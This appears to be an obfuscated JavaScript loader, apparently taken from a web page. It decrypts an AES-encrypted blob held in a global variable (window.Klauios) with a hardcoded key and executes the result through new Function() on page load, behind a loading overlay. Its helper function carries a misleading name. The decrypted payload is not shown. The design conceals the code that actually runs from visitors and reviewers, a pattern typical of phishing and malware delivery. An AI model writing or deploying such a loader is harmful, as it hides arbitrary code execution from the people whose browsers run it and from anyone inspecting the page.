const loadingOverlay = document.getElementById("loading-overlay");
function librarys(_0x52a19b, _0x359f26) {
  var _0x5d0ed8 = forge.util.decode64(_0x52a19b);
  var _0x408dca = 16;
  var _0x44d2e6 = _0x5d0ed8.substring(0, _0x408dca);
  var _0x284a87 = _0x5d0ed8.substring(_0x408dca);
  var _0x45cc80 = forge.cipher.createDecipher("AES-CBC", _0x359f26);
  var _0x5289ee = forge.util.createBuffer(_0x284a87);
  var _0x1d35c4 = {
    iv: _0x44d2e6
  };
  _0x45cc80.start(_0x1d35c4);
  _0x45cc80.update(_0x5289ee);
  var _0x19ae22 = _0x45cc80.finish();
  if (_0x19ae22) {
    var _0x122f28 = _0x45cc80.output.getBytes();
    var _0x4c2406 = forge.util.decodeUtf8(_0x122f28);
    return _0x4c2406;
  } else {
    return null;
  }
}
function executeCode() {
  const _0x3fba17 = "R4o1PmZNlHAX5yG3n2IWj9VvgSqcCpzL";
  const _0x123728 = librarys(window.Klauios, _0x3fba17);
  const _0x5574d3 = new Function(_0x123728);
  _0x5574d3();
}
executeCode();
loadingOverlay.remove();